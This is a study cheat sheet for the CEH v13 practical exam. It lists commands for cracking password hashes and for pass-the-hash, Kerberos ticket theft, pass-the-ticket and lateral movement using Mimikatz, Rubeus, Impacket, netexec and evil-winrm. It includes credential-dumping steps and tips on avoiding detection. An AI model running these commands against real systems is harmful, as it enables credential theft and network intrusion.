# CEH v13 Cheat Sheet

Cheat sheet for CEH v13 Pratical Exam on May 15th, 2026

## Password Cracking
### Hash ID
Check supplies hashes against a built-in list to suggest potential formats. 
- `hashid -j 193069ceb0461e1d40d216e32c79c704`
  - `-j` will list the corresponding JtR format
  - `-m` will identify the hashcat type.mode

### John the Ripper (JtR)

#### **Commands**
- Run a single crack mode attack on file `passwrd`
  - `john --single passwd`
- Use a wordlist to crack passwords with a dictionary attack
  - `john --wordlist=<wordlist_file> <hash_file>`   
- Use incremental mode to brute-force password cracking
  - `john --incremental <hash_file>`  
- Use `–format` to instruct JtR which format the target hashes have
  - `john --format=afs [...] <hash_file>`  
- Crack password-protected or encrypted files to process files and produce hashes compatible with JtR
  - `<xxx2john> <file_to_crack> > file.hash (i.e. pdf2john or ssh2john or wpa2john)`  

#### **JtR Notes**
- One of the most effective and widely used rulesets is best64.rule
- We can generate wordlists using CeWL, a tool that scans potential words from a company’s website and saves them in a separate list
  - `cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist`
    - `-d` is depths to spider
    - `-m` is minimum word length
    - `–lowercase` is store words in lowercase
    - `-w` file to be stored in
- Use `locate *2john*` to see all the different hash options

### Hashcat
- Basic command
  - `hashcat -a 0 -m 0 <hashes> [wordlist, rule, mask, ...]`
    - `-a` specifies attack mode
      - `0` performs a dictionary attack
      - `3` defines a mask attack
    - `-m` specifies hash type
      - `0` defines hash as md5
      - `1000` defines hash as NTLM
      - `2100` defines hash as DCC2 
    - `<hashes>` is either a hash string or file condoning one or more password hashes of the same type
    - `[wordlist, rule, mask, ...]` is placeholder for additional arguments  
- Perform a mask attack
  - `hashcat -a 3 -m 0 <hash> '?u?l?l?l?l?d?s'`
    - `'?u?l?l?l?l?d?s'` defines passwords starting with an uppercase letter, continue with four lowercase letters, a digit, and then a symbol
- Use a ruleset
  -  `hashcat -a 0 -m 0 <hash> rockyou.txt -r /usr/share/hashcat/rules/best64.rule`

## Attacks

### Pass the Hash (PtH) 

#### Using Mimikatz (Windows)
```
privilege::debug
sekurlsa::pth /user:julio /rc4:<hash> /domain:inlanefreight.htb /run:cmd.exe
```
- `/user`: the user name we want to impersonate.
- `/rc4` or `/NTLM`: NTLM hash of the user's password.
- `/domain`: Domain the user to impersonate belongs to. In the case of a local user account, we can - use the computer name, localhost, or a dot (.).
- `/run`: The program we want to run with the user's context (if not specified, it will launch cmd.exe).

#### Using Impacket (Linux)
```
impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
```

#### Using Netexec (Linux)
```
# Spray across subnet
netexec smb 172.16.1.0/24 -u Administrator -d . -H <hash>

# Local auth across subnet
netexec smb 172.16.1.0/24 -u Administrator -H <hash> --local-auth

# Execute command
netexec smb <IP> -u Administrator -d . -H <hash> -x whoami
```

#### Using Netexec (Linux)
```
# Local account
evil-winrm -i <IP> -u Administrator -H <hash>

# Domain account
evil-winrm -i <IP> -u administrator@inlanefreight.htb -H <hash>
```


### Pass the Ticket (PtT) Windows

#### 1. Export Kerberos Tickets from Windows

**Mimikatz:**
```
mimikatz.exe
privilege::debug
sekurlsa::tickets /export        # exports .kirbi files
sekurlsa::ekeys                  # dump AES/RC4 keys
```
**Rubeus:**
```
Rubeus.exe dump /nowrap          # dump all tickets as Base64
```

#### 2. OverPass the Hash (Pass the Key)

**Mimikatz (RC4):**
```
sekurlsa::pth /domain:domain.htb /user:username /ntlm:<hash>
```
**Rubeus (AES256 — preferred, less detectable):**
```
Rubeus.exe asktgt /domain:domain.htb /user:username /aes256:<hash> /nowrap
```

#### 3. Pass the Ticket

**Rubeus — request TGT and inject immediately:**
```
Rubeus.exe asktgt /domain:domain.htb /user:username /rc4:<hash> /ptt
```
**Rubeus — inject existing ticket:**
```
Rubeus.exe ptt /ticket:<base64>
Rubeus.exe ptt /ticket:ticket.kirbi
```
**Mimikatz — inject .kirbi:**
```
kerberos::ptt "C:\path\to\ticket.kirbi"
```
**Convert .kirbi to Base64 (PowerShell):**
```
[Convert]::ToBase64String([IO.File]::ReadAllBytes("ticket.kirbi"))
```

#### 4. Lateral Movement via PowerShell Remoting

**Mimikatz path:**
```
# 1. Import ticket in mimikatz
kerberos::ptt "ticket.kirbi"
# 2. Exit mimikatz, launch PowerShell from same cmd window
powershell
Enter-PSSession -ComputerName DC01
```
**Rubeus path:**
```
# 1. Create sacrificial process
Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
# 2. In new window, request TGT and inject
Rubeus.exe asktgt /user:username /domain:domain.htb /aes256:<hash> /ptt
# 3. Launch PowerShell
powershell
Enter-PSSession -ComputerName DC01
```

#### Key Notes
| Item | Detail |
|------|--------|
| TGT | Used to request access to any resource |
| TGS | Used for a specific service only |
| `.kirbi` ending in `$` | Computer account ticket |
| `krbtgt` ticket | That user's TGT |
| RC4 vs AES256 | AES256 preferred — RC4 triggers encryption downgrade alert |
| Mimikatz PtT | Requires admin rights |
| Rubeus PtT | Does not require admin rights |
| Ports | TCP 5985 (HTTP) / 5986 (HTTPS) for WinRM/PSRemoting |


